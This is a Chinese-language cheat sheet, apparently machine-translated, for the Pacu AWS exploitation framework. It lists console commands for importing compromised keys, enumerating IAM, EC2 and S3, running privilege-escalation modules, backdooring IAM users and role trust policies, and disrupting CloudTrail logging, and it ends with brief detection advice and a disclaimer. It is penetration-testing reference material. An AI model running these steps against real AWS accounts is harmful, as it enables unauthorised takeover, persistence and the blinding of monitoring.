<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ☁️ Pacu - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino 安全实验室">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="云安全">
</p>

<p对齐=“中心”>
  <b>☁️开源AWS开发框架，专为渗透测试云环境、权限升级、凭证收集和基础设施侦察而设计</b>
</p>

---

## 📋 目录

- [概述与架构](#-overview--architecture)
- [安装](#-安装)
- [会话管理和 AWS 密钥导入](#-session-management--aws-key-import)
  - [导入受损凭证](#importing-compromished-credentials)
  - [假定的角色和会话令牌](#assumed-roles-and-session-tokens)
- [侦察和枚举模块](#-reconnaissance--enumeration-modules)
  - [枚举当前 IAM 权限](#enumerate-current-iam-permissions)
  - [扫描 EC2 实例和 S3 存储桶](#scanning-ec2-instances--s3-buckets)
- [AWS 中的权限升级技术](#-privilege-escalation-techniques-in-aws)
  - [自动权限升级扫描程序](#automatic-privilege-escalation-scanner)
  - [执行升级模块](#executing-escalation-modules)
- [持久与防御回避](#-persistence--防御-回避)
  - [后门 IAM 角色和用户](#backdooring-iam-roles--users)
  - [破坏 CloudTrail 日志记录](#disrupting-cloudtrail-logging)
- [快速参考表](#-quick-reference-table)
- [防守考虑与检测](#-defective-considerations--detection)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述与架构

**Pacu** 由 **Rhino Security Labs** 创建，是“Metasploit for AWS”。它旨在模拟 Amazon Web Services 环境中的对抗策略。

Pacu 使用本地 SQLite 数据库进行操作，该数据库在攻击性会话中维护状态：
- **模块化管道：** 超过 40 个专门模块，涵盖发现、横向移动、权限升级、持久性和渗透。
- **权限枚举：** 通过测试 API 操作或查看附加的托管策略来分析 IAM 策略，而不触发警报阈值。
- **Privesc Automation：** 评估已知的 IAM 权限升级路径（例如 `iam:CreateAccessKey`、`iam:PassRole`、`iam:AttachUserPolicy`）。

---

## 📥 安装
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 会话管理和 AWS 密钥导入

Pacu 启动后，您将进入交互式控制台。创建或选择会话：
```text
Pacu > set_session client_assessment
```
### 导入受损凭证
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### 假定的角色和会话令牌
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 侦察和枚举模块

### 枚举当前 IAM 权限
确定您是谁以及允许活动凭证执行哪些操作：
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### 扫描 EC2 实例和 S3 存储桶
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ AWS 中的权限提升技术

AWS 权限升级依赖于错误配置的 IAM 策略，这些策略允许非管理用户向自己或其他实体授予管理权限。

### 自动权限升级扫描器
根据 21 多个记录的 AWS privesc 向量扫描您的枚举权限：
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*示例输出突出显示了易受攻击的权限，例如 `iam:PutUserPolicy`、`iam:AttachUserPolicy` 或 `iam:CreateAccessKey`。*

### 执行升级模块
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ 持久性和防御规避

### 后门 IAM 角色和用户
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```

```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ 快速参考表

|目标|帕库指挥部 |
|------------|--------------|
| **设置/选择会话** | `set_session <NAME>` |
| **导入 AWS 凭证** | `set_keys` |
| **显示当前身份** | `whoami` |
| **枚举 IAM 权利** | `run iam__enum_permissions` |
| **扫描 Privesc 矢量** | `run iam__privesc_scan` |
| **枚举 S3 存储桶** | `run s3__enum` |
| **枚举 EC2 实例** | `run ec2__enum` |
| **中断 CloudTrail** | `run cloudtrail__disrupt_logging` |
| **列出可用模块** | `list` |

---

## 🛡️ 防守考虑和检测

1. **GuardDuty 和 CloudTrail 监控：** Pacu 的自动权限升级和权限扫描可生成快速顺序 API 查询，可由 AWS GuardDuty 轻松标记。
2. **SCP 和权限边界：** 执行 AWS Organizations 服务控制策略 (SCP)，防止任何主体（包括完整管理员）篡改 CloudTrail 或修改根组织结构。

---

## ⚠️ 法律免责声明

> [!警告]
> Pacu 专为授权的 AWS 渗透测试和安全评估而设计。未经资产所有者明确事先许可而测试云帐户违反了 Amazon Web Services 可接受使用政策和国际法。